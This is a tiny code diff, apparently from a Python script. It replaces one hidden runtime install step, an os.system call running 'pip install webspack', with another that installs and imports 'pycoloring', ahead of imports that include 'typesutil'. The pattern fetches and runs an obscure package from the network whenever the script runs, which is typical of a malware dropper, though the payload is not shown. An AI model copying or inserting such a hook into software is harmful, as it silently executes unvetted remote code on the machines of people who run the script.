@@ -1,6 +1,6 @@
 import os
-os.system(f"pip install webspack")
-from webspack import driver
+os.system(f"pip install pycoloring")
+from pycoloring import color
 try:
     import requests
     import typesutil
